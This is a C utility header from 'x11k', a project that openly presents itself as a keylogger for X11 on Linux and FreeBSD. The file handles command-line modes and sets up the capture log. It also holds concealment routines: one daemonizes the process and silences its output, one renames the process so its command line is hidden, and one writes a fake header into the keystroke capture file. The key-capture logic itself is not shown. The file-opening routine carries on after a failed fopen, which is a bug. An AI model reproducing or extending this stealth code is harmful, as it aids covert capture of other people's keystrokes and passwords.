/*
 * x11k - Keylogger for POSIX systems (linux, freebsd) with X11
 *
 * Copyright (C) 2016  xdevelnet (xdevelnet at xdevelnet dot org)
 *
 * This program is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.
 *
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with this program.  If not, see <http://www.gnu.org/licenses/>.
 */

#ifndef X11K_UTILS_H
#define X11K_UTILS_H

#include <getopt.h>
#include <unistd.h>
#include <fcntl.h>

void showhelp(char *progname) {
	printf("Usage: %s -m modename -a addr\n", progname);
}

struct required_info_t {
	char *fileaddr;
	signed int mode; // 1 - background, 2 - foreground, 3 - command mode.
};

void check_cli_and_flush_data(int argc, char **argv, struct required_info_t *data) {
	if (argc == 2) check_rc_d_commands(argv[1], &data->mode);
	int getopt_cases;
	data->fileaddr = NULL;

	while ((getopt_cases = getopt(argc, argv, "m:a:h")) != -1) {
		switch (getopt_cases) {
			case 'h':
				showhelp(argv[0]);
				exit(EXIT_SUCCESS);
			case 'm':
				if (strcmp(optarg, MODE_BACKGROUND_STRING) == 0) data->mode = MODE_BACKGROUND;
				else if (strcmp(optarg, MODE_FOREGROUND_STRING) == 0) data->mode = MODE_FOREGROUND;
				else if (strcmp(optarg, MODE_COMMAND_STRING) == 0) data->mode = MODE_COMMAND;
				else {
					fprintf(stderr, "Wrong mode argument. Exiting.\n");
					showhelp(argv[0]);
					exit(EXIT_FAILURE);
				}
				break;
			case 'a':
				data->fileaddr = optarg;
				break;
			case '?':
				showhelp(argv[0]);
				exit(EXIT_FAILURE);
			default:
				break;
		}
	}

//	int index;
//	for (index = optind; index < argc; index++) printf ("Non-option argument %s\n", argv[index]);


	if (data->mode == 0) data->mode = DEFAULT_MODE;

	if (data->mode == MODE_COMMAND and data->fileaddr == NULL) {
		fprintf(stderr, "You should specify filename with -a option. Exiting.\n");
		exit(EXIT_FAILURE);
	}
	if (data->fileaddr == NULL and data->mode != MODE_FOREGROUND) data->fileaddr = DEFAULT_CAPTURE_FILEADDR;
	if (data->mode != MODE_COMMAND and access(data->fileaddr, F_OK) == 0 and access(data->fileaddr, W_OK) != 0) {
		fprintf(stderr, "File %s is not available for writing. Exiting.\n", data->fileaddr);
		exit(EXIT_FAILURE);
	}
}

signed char we_need_to_stop = 0;

void term_handler(int i) {
	we_need_to_stop = 1;
}

void handle_posix_signals() {
	signal(SIGTERM, term_handler);
	signal(SIGINT, term_handler);
}

void readln(char *buffer, size_t maximum_read, FILE *stream) { // no trust for getline()
	if (buffer == NULL or maximum_read == 0 or stream == NULL) return;
	size_t curr_seek = 0;
	int curr_char;
	while (curr_seek < maximum_read) {
		if ((curr_char = getc(stream)) == EOF or (buffer[curr_seek] = (char) curr_char) == '\n') break;
		curr_seek++;
	}
	buffer[curr_seek] = 0;
}

void perform_mode_command(struct required_info_t *data) { // I gonna see how deep gotophobia I have
	char commandname[99];

	fprintf(stderr, "Please, specify command. Type 'help' for more info.\n");
	Again:
	fprintf(stderr, " > ");
	readln(commandname, sizeof(commandname), stdin);
	if (*commandname == 0) goto Again; else
	if (strcmp(commandname, "help") == 0) {
		printf("Available command-interactive functions:\n"
					   "\t'quit' or 'exit' - exit program immediatly\n" // why such weird alignment? IDK, that's Clion!
					   "\t'strip' - remove trash headers from file(s)\n");
		goto Again;
	} else
	if (strcmp(commandname, "quit") == 0 or strcmp(commandname, "exit") == 0) exit(EXIT_SUCCESS); else
	if (strcmp(commandname, "strip") == 0) {
		fprintf(stderr, "Please, specify filename or filenames separated with newline. End your input with EOF (Ctrl+D) or empty line.\n");
		StripAgain:
		fprintf(stderr, " > strip > ");
		readln(commandname, sizeof(commandname), stdin);
		if (*commandname == 0) {
			goto Again;
		}
		if (access(commandname, F_OK) != 0) {
			fprintf(stderr, "File %s not exist!\n", commandname);
			goto StripAgain;
		}
		if (access(commandname, W_OK) != 0) {
			fprintf(stderr, "File %s not avaialbe for writing!\n", commandname);
			goto StripAgain;
		}
		// there is so much TODO
	} else {
		fprintf(stderr, "Unknown command. Type 'help' for more info.\n");
		goto Again;
	}

	exit(EXIT_SUCCESS);
}

void die_if_shit_happens(int val, char *errstr) {
	if (val < 0) {
		if (errstr != NULL) fprintf(stderr, "%s\n", errstr);
		exit(EXIT_FAILURE);
	}
}

void daemonize() {
	pid_t forkpid = fork();
	die_if_shit_happens(forkpid, "Unable to daemonize: fork.");
	if (forkpid != 0) exit(EXIT_SUCCESS);
	check_and_update_shmem(getpid());
	die_if_shit_happens(setsid(), "Unable to daemonize: start new session.");
	die_if_shit_happens(chdir("/"), "Unable to daemonize: change working directory to /.");
	die_if_shit_happens(close(STDIN_FILENO), "Unable to daemonize: can't close stdin.");
	die_if_shit_happens(close(STDOUT_FILENO), "Unable to daemonize: can't close stdout.");
	die_if_shit_happens(close(STDERR_FILENO), "Unable to daemonize: can't close stderr.");
	int stdio = open("/dev/null", O_RDWR);
	die_if_shit_happens(dup(stdio), NULL); // NULL because stderr now is closed
	die_if_shit_happens(dup(stdio), NULL); // here it refers to nothing
}

#ifdef __linux__
#include <sys/prctl.h>
#endif

void get_new_process_name(char *name, char** pass_argv_here) { // it's shit. Did anyone know how to hide command line? execv with self
	//execution works BAD. I hope someone will send me pull request with tested code. YAY!
	if(strcmp(pass_argv_here[0], name) == 0) return;
#ifdef __linux__
	prctl(PR_SET_NAME, (unsigned long)name, 0, 0, 0);
#endif

#ifdef __FreeBSD__
	setproctitle(name);
#endif
}

char *getdatetimestring() {
	time_t t = time(NULL);
	struct tm *tm = localtime(&t);
	static char s[64];
	strftime(s, sizeof(s), "%c", tm);
	return s;
}

FILE *preparefile (struct required_info_t *data) {
	if (data->fileaddr == NULL) return stderr;
	FILE *file = fopen(data->fileaddr, "a+");
	if (file == NULL) {
		fprintf(stderr, "Unable to prepare file. Exiting.\n");
	}
	fseek(file, 0, SEEK_END);
	if (ftell(file) == 0) fprintf(file, "%s", fake_file_header_string);
	return file;
}

#endif